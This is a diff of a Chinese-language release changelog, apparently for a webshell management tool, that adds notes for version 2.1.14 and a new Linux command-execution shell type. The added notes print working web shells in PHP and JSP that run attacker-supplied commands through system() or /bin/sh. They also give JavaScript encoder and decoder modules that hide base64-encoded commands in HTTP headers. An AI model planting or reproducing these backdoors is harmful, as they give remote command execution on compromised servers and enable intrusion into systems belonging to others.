@@ -2,7 +2,98 @@
 > 有空会补补BUG、添添新功能。    
 > 同时也欢迎大家的参与！感谢各位朋友的支持！ .TAT.
 
-## 2021/06/19 `2.1.13`
+## `v(2.1.14)`
+
+### 核心
+
+* 新增 CMDLINUX Shell 类型
+
+> 基于命令执行的一句话类型, 仅支持 Linux 环境
+
+只要有一个可以执行命令的点, 就可以快乐起来 :)
+
+* PHP:
+
+```php
+<?php system($_POST['ant']);?>
+```
+
+* 比较流行的 JSP 命令执行 WebShell
+
+```jsp
+<%
+  if(request.getParameter("cmd")!=null){
+    java.io.InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")}).getInputStream();
+    int a = -1;
+    byte[] b = new byte[1];
+    out.print("<pre>");
+    while((a=in.read(b))!=-1){
+      out.print(new String(b));
+    }
+    out.print("</pre>");
+  }
+%>
+```
+
+**注意: Runtime.exec 方法直接传入字符串时不支持多条命令拼接，需要使用数组方式**
+
+### 数据库管理
+
+* 新增 CMDLINUX 类型数据库管理(支持 mysql、sqlite3)
+
+> 利用 mysql和sqlite3 客户端命令，需要目标上有对应的二进制
+
+* 修复 PHP SQLite 下自动生成的 sql 语句语法错误的 Bug
+
+### 系统设置
+
+* 编码管理支持 cmdlinux 类型
+
+在使用 cmdlinux 类型时，如果接收参数在 HTTP Header 部分, 请务必使用编码器，因为部分 Payload 有换行符
+
+eg:
+
+WebShell:
+
+```php
+<?php system(base64_decode($_SERVER["HTTP_CMD"])); ?>
+```
+
+对应该的编码器如下:
+
+```js
+'use strict';
+
+module.exports = (pwd, data, ext={}) => {
+  let headers = ext.opts.httpConf.headers;
+  headers[pwd] = Buffer.from(data['_']).toString('base64');
+  delete data['_'];
+  return data;
+}
+```
+
+* 解码器支持 CMDLinux
+
+base64 解码器:
+
+```js
+/**
+ * cmdlinux::base64解码器
+ */
+
+'use strict';
+
+module.exports = {
+  asoutput: () => {
+    return `asenc(){ base64 "$@"; };` // 注意此处是 Shell 语法
+  },
+  decode_buff: (buff) => {
+    return Buffer.from(buff.toString(), 'base64');
+  }
+}
+```
+
+## 2021/06/19 `v(2.1.13)`
 
 ### 核心
 
